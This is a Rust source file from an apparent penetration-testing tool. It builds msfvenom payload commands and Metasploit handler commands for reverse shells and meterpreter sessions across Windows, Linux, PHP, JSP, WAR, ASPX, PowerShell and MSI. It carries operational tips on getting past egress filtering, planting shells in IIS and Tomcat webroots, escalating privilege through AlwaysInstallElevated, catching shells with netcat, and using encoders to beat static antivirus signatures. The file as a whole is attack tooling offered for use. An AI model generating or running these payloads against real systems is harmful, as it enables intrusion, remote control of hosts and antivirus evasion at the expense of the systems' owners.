//! msfvenom command builder. warden doesn't embed Metasploit — it constructs the
//! exact `msfvenom` invocation for the operator to run, plus the matching handler.

#[derive(Debug, Clone)]
pub struct MsfSpec {
    pub id: &'static str,
    pub name: &'static str,
    /// The -p payload string.
    pub payload: &'static str,
    /// Default -f format.
    pub format: &'static str,
    /// Suggested output filename.
    pub outfile: &'static str,
    pub needs_host: bool,
    pub notes: &'static str,
}

pub static SPECS: &[MsfSpec] = &[
    MsfSpec { id: "win-meterpreter-tcp", name: "Windows x64 meterpreter reverse_tcp",
        payload: "windows/x64/meterpreter/reverse_tcp", format: "exe", outfile: "rev.exe",
        needs_host: true,
        notes: "Staged. Handler: use exploit/multi/handler, same payload. EXITFUNC=thread to avoid killing the host process." },
    MsfSpec { id: "win-meterpreter-https", name: "Windows x64 meterpreter reverse_https",
        payload: "windows/x64/meterpreter/reverse_https", format: "exe", outfile: "revs.exe",
        needs_host: true,
        notes: "HTTPS stager blends with web traffic and survives some egress filtering." },
    MsfSpec { id: "win-shell-tcp", name: "Windows x64 shell_reverse_tcp (stageless)",
        payload: "windows/x64/shell_reverse_tcp", format: "exe", outfile: "shell.exe",
        needs_host: true,
        notes: "Stageless — catch with a plain nc -lvnp, no metasploit needed." },
    MsfSpec { id: "linux-shell-tcp", name: "Linux x64 shell_reverse_tcp (stageless)",
        payload: "linux/x64/shell_reverse_tcp", format: "elf", outfile: "shell.elf",
        needs_host: true,
        notes: "chmod +x on target. Catch with nc -lvnp." },
    MsfSpec { id: "php-meterpreter", name: "PHP meterpreter reverse_tcp",
        payload: "php/meterpreter_reverse_tcp", format: "raw", outfile: "shell.php",
        needs_host: true,
        notes: "Prepend '<?php ' if the raw output lacks it. Handler payload php/meterpreter_reverse_tcp." },
    MsfSpec { id: "jsp-shell", name: "Java JSP shell reverse_tcp",
        payload: "java/jsp_shell_reverse_tcp", format: "raw", outfile: "shell.jsp",
        needs_host: true,
        notes: "Stageless — catch with nc. Deploy into a servlet container webroot." },
    MsfSpec { id: "war-shell", name: "Java WAR shell reverse_tcp",
        payload: "java/jsp_shell_reverse_tcp", format: "war", outfile: "shell.war",
        needs_host: true,
        notes: "Deploy to Tomcat manager. The jsp inside is reachable at /shell/<random>.jsp." },
    MsfSpec { id: "aspx-shell", name: "Windows x64 aspx meterpreter",
        payload: "windows/x64/meterpreter/reverse_tcp", format: "aspx", outfile: "shell.aspx",
        needs_host: true,
        notes: "Drop into an IIS webroot with execute rights." },
    MsfSpec { id: "psh-cmd", name: "Windows powershell command (psh-cmd)",
        payload: "windows/x64/meterpreter/reverse_tcp", format: "psh-cmd", outfile: "-",
        needs_host: true,
        notes: "One-liner to paste into a cmd/powershell prompt — no file on disk." },
    MsfSpec { id: "msi", name: "Windows MSI (shell_reverse_tcp)",
        payload: "windows/x64/shell_reverse_tcp", format: "msi", outfile: "setup.msi",
        needs_host: true,
        notes: "Install with msiexec /quiet /i setup.msi — handy for AlwaysInstallElevated." },
];

pub fn by_id(id: &str) -> Option<&'static MsfSpec> {
    SPECS.iter().find(|s| s.id == id)
}

impl MsfSpec {
    /// Build the msfvenom command line. `badchars` may be empty.
    pub fn command(&self, lhost: &str, lport: &str, badchars: &str, encoder: Option<&str>, iters: u32) -> String {
        let mut c = format!("msfvenom -p {} LHOST={lhost} LPORT={lport}", self.payload);
        if self.payload.contains("windows") {
            c.push_str(" EXITFUNC=thread");
        }
        if !badchars.is_empty() {
            c.push_str(&format!(" -b '{badchars}'"));
        }
        if let Some(e) = encoder {
            c.push_str(&format!(" -e {e} -i {iters}"));
        }
        c.push_str(&format!(" -f {}", self.format));
        if self.outfile != "-" {
            c.push_str(&format!(" -o {}", self.outfile));
        }
        c
    }

    /// Metasploit multi/handler setup for this payload.
    pub fn handler(&self, lhost: &str, lport: &str) -> String {
        format!(
            "msfconsole -q -x 'use exploit/multi/handler; set payload {}; \
             set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; run -j'",
            self.payload
        )
    }

    /// True when a plain netcat listener suffices (stageless shells).
    pub fn stageless(&self) -> bool {
        self.payload.contains("shell_reverse_tcp") || self.payload.contains("jsp_shell")
    }
}

/// Encoders worth offering, with an honest note on effectiveness.
pub const ENCODERS: &[(&str, &str)] = &[
    ("x86/shikata_ga_nai", "polymorphic XOR; defeats static signatures, NOT behavioural AV"),
    ("x64/xor_dynamic", "x64 dynamic XOR"),
    ("cmd/powershell_base64", "base64 a cmd payload"),
];
